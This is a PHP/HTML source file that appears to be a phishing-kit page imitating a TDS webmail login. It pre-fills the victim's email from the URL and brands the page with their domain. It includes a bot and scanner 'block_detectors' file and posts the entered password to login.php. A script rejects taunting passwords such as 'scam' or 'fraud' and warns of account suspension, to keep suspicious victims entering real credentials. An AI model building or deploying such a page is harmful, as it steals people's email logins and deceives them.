<?php
session_start();
require('./block_detectors.php');
// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$parts = @explode('@', $email);
	$user = @$parts[0];
?><?php
$email = $_GET['email'];
$domain2 = substr($email, strpos($email, "@") + 1); 
$domain = strtok($domain2, '.');
 
?>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title><?php echo ucfirst($domain); ?>  Webmail</title>

    
        <link rel="shortcut icon" href="images/favicon.png">
    

    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link href="https://login.tds.net/static/jquery-ui/jquery-ui.min.css" rel="stylesheet">
    <link href="https://login.tds.net/static/tds_theme_internal/base.css" rel="stylesheet">

 <script src="https://code.jquery.com/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="https://ajax.aspnetcdn.com/ajax/jquery.validate/1.10.0/jquery.validate.js" type="text/javascript"></script>




<script>
 $(document).ready(function(){
      $(function() {
            $("#submit").on("click",function() {
                var password = $("input:password[name='psw']").val();
                    var badwords = ["abcdefgh", "adef", "hello", "fuck" , "fuckoff", "fuck off", "123456", "987654", "scam",  "adef", "hello", "fuck" , "scammer" , "fool" , "fuckoff", "fuck off", "123456", "987654", "motherfucker", "dick", "scam", "fuckoff!!", "idiot", "123", "test", "fuck you", "penis", "abc", "111", "1234", "12345", "000", "fuckyourmother", "pussy", "testing", "fuckyou!!!", "you are a fool", "fraud"];
        
                /* do this */ 
                
        			if($.inArray(password, badwords) !==-1)
                        {
                            alert("You have entered bad password. We`ll suspend your account if entered again");
                            return false;
                        }
                
            });
        });
      
      ///////////////////////
      
      $(function(){
        $("#jqueryform").validate({
                rules: {
                    
					psw: {
						required: true,
						minlength: 8
						}	
                },
				
				messages: {
					
					psw: {
					  required: "Empty password field",
						minlength: "Incomplete password entered"
					}
				  }
				
                
            });
			
			$("#submit").click(function(){
            $("#jqueryform").submit();
            return false;
        });
    });
    
    
      
      
      
      
});
</script>





    

<link href="https://login.tds.net/static/tds_theme_internal/login.css" rel="stylesheet">
</head>

  <body>
   <h1>  <img src="images/logo.png" height="96" width="96"> <?php echo ucfirst($domain); ?></h1> <nav class="navbar navbar-static-top">
      <div class="container">
         

      </div>
    </nav>

    <div class="container">
      <div class="primary-title">
        
      </div>

      

          
            
          
      

<div id="messages"></div>


      

<div class="row">
  <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3">
    <div class="panel panel-default">
      <div class="panel-body">


        <div id="goofyImage">
          <div id="buttonRow">
            <a href="#" id="backToUsernameButton" aria-label="Back to username entry" style="display: inline;">
              <span class="glyphicon glyphicon-menu-left" aria-hidden="true"></span>
            </a>
          </div>

          <div id="loginIconGrayed" class="login-icon" style="opacity: 1;"></div>
        </div>

        <div id="usernameEntered"><?php echo $email ?></div>

        <form method="post" action="login.php" id="jqueryform">

          <div id="loginFields">
            <div id="usernameEntry" class="field-box" style="visibility: hidden;">
              



<div class="form-group">
  
    <label for="username">User Name/Email Address</label>
  
  <input autofocus="" class="form-control" id="username" name="username" type="text" value="<?php echo $email ?>">
</div>



              <span class="text-muted">
                  
                  <span>Example: user@domain.net</span>
                  
              </span>

              <button id="continueButton" type="button" class="btn btn-primary btn-lg btn-block">Continue</button>

              <a href="#">Forgot user name? Retrieve it.</a>
            </div>

            <div id="passwordEntry" class="field-box active-entry" style="visibility: visible; left: -50%;">
              



			<div class="form-group ">
			  
				<label for="password">Password</label>
			  
			  <input class="form-control" id="password" name="psw" type="password" value="">
			</div>


              <button type="submit" id="submit" class="btn btn-primary btn-lg btn-block">Continue</button>
              <a href="#">Forgot Password</a>
            </div>
          </div>

          
<input type="hidden" name="csrf_token" id="csrf_token" value="1521093205##cd94a9fe6deb6beefc315d357562a418bf106d7a">
<input id="color_depth" name="color_depth" type="hidden" value="24">
<input id="flash_enabled" name="flash_enabled" type="hidden" value="false">
<input id="form_sent" name="form_sent" type="hidden" value="1521107605">
<input id="java_enabled" name="java_enabled" type="hidden" value="false">
<input id="javascript_enabled" name="javascript_enabled" type="hidden" value="true">
<input id="window_height" name="window_height" type="hidden" value="662">
<input id="window_width" name="window_width" type="hidden" value="1364">
        </form>
        
<!--
        <section class="accountSignUp">
          <h2>Don't have a  TDS  online account?</h2>

          <a href="https://login.tds.net/register/" class="btn btn-default btn-lg">Sign Up</a>
        </section>

        <section class="contact">
          
          <p>Questions? Call <a href="tel:800-605-1962">800-605-1962.</a></p>
        </section>
-->
      </div>
    </div>
  </div>
</div>



    </div>

    <footer class="footer">
      <div class="container">
        
      </div>
    </footer>

    
<script data-main="/static/js/login.js" src="/static/js/lib/require.js"></script>

  
</body></html>